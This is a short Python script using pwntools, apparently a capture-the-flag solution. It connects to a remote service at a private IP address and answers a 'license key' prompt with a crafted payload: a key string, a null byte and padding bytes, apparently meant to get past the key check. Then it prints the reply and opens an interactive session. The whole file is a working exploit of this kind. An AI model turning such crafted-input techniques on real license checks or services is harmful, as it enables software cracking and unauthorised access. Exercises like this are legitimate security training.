from pwn import remote


P = remote("10.212.173.64", 32_180)


def main() -> None:
    payload = b"aypuv-Apm4Y-Lf1l8-W0fz6-yM8JC"
    payload += b"\x00"
    payload += b"A" * 10

    P.sendlineafter(b"Ready to receive your license key: ", payload)

    print(P.recvall().decode())

    P.interactive()


if __name__ == "__main__":
    main()
